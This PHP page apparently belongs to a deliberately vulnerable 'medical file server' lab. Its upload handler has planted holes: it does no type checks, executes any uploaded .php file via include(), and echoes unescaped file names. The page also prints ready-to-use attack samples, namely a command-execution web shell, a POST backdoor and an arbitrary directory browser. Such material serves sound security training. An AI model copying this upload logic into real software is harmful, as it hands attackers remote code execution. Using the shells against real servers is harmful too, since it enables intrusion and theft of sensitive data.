<?php
// Simple File Upload with Vulnerabilities
session_start();

if (!isset($_SESSION['authenticated'])) {
    header('Location: index.php');
    exit;
}

if (isset($_POST['upload'])) {
    $target_dir = "/var/medical-files/temp/";
    $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

    // No file type validation - allows any file upload
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        $message = "File " . basename($_FILES["fileToUpload"]["name"]) . " uploaded successfully.";

        // Execute uploaded files if they are scripts
        $file_extension = pathinfo($target_file, PATHINFO_EXTENSION);
        if ($file_extension == 'php') {
            $message .= "<br><strong>PHP file detected. Executing...</strong>";
            include($target_file);
        }
    } else {
        $error = "Sorry, there was an error uploading your file.";
    }
}

?>

<!DOCTYPE html>
<html>
<head>
    <title>File Upload - Medical File Server</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .container { max-width: 600px; margin: 0 auto; }
        .upload-form { background: #f5f5f5; padding: 20px; border-radius: 5px; }
        .error { color: red; }
        .success { color: green; }
    </style>
</head>
<body>
    <div class="container">
        <h1>File Upload</h1>
        <p><a href="index.php">← Back to Main</a> | <a href="file_manager.php">File Manager</a></p>
        
        <?php if (isset($message)): ?>
            <p class="success"><?php echo $message; ?></p>
        <?php endif; ?>
        
        <?php if (isset($error)): ?>
            <p class="error"><?php echo $error; ?></p>
        <?php endif; ?>
        
        <div class="upload-form">
            <h3>Upload Medical Files</h3>
            <form action="" method="post" enctype="multipart/form-data">
                <p>
                    <label>Select file to upload:</label><br>
                    <input type="file" name="fileToUpload" id="fileToUpload">
                </p>
                <p>
                    <input type="submit" value="Upload File" name="upload">
                </p>
            </form>
            
            <p><strong>Note:</strong> This upload accepts any file type without validation.</p>
            <p><small>Try uploading: .php, .jsp, .asp, .exe files for testing</small></p>
        </div>
        
        <div class="upload-form">
            <h3>Sample Malicious Files for Testing</h3>
            <p>Create these files locally and upload them:</p>
            
            <h4>PHP Web Shell (webshell.php):</h4>
            <pre>&lt;?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?&gt;</pre>
            
            <h4>Simple Backdoor (backdoor.php):</h4>
            <pre>&lt;?php
echo "&lt;pre&gt;";
system($_POST['command']);
echo "&lt;/pre&gt;";
?&gt;</pre>
            
            <h4>File Browser (browse.php):</h4>
            <pre>&lt;?php
$dir = $_GET['dir'] ?? '/';
echo "&lt;h3&gt;Directory: $dir&lt;/h3&gt;";
foreach(scandir($dir) as $file) {
    echo "&lt;a href='?dir=$dir/$file'&gt;$file&lt;/a&gt;&lt;br&gt;";
}
?&gt;</pre>
        </div>
        
        <div class="upload-form">
            <h3>Recently Uploaded Files</h3>
            <?php
            $temp_dir = "/var/medical-files/temp/";
            if (is_dir($temp_dir)) {
                $files = scandir($temp_dir);
                foreach ($files as $file) {
                    if ($file != "." && $file != "..") {
                        echo "<p><a href='/temp/$file' target='_blank'>$file</a> - ";
                        echo "Size: " . filesize($temp_dir . $file) . " bytes - ";
                        echo "Modified: " . date("Y-m-d H:i:s", filemtime($temp_dir . $file));
                        echo "</p>";
                    }
                }
            }
            ?>
        </div>
    </div>
</body>
</html>
